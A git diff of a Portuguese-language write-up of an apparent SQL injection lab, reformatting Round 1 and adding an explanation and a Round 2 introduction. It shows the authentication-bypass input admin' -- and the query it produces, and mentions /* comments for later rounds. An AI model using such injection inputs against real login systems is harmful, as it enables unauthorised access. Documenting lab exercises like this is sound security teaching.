@@ -31,28 +31,20 @@ Round 1:
 No primeiro round, a consulta SQL aceita o uso de comentários para ignorar a parte da senha. Isso foi feito utilizando o símbolo --, que serve para comentar tudo após ele na consulta.
 
 Entrada:
-
+```
 Usuário: admin' --
 Senha: qualquercoisa
-
+```
 ```
 SELECT * FROM users WHERE username = 'admin' --' AND password = 'qualquercoisa'
 ```
 
-![image](https://github.com/user-attachments/assets/75983be8-7be6-46fd-a23d-bb24e4897f6c)
-
-```
-round 1 - 
-username:
-admin' --           ( -- comenta todo resto )
-password:
-qualquercoisa
-
-SELECT * FROM users WHERE username = 'admin' --' AND password = 'qualquercoisa'
-```
+Neste caso, a parte da senha foi ignorada devido ao comentário, permitindo o login com o usuário "admin".
 
 ![image](https://github.com/user-attachments/assets/cfa0cf35-6072-4005-8687-220fffe93a8e)
 
+Round 2:
+No segundo round, foi possível observar que mais palavras-chave estavam permitidas na consulta SQL, como /*, outro tipo de comentário. A ideia era testar se podíamos usar esses novos filtros para burlar a autenticação.
 
 round 2 -
 username:
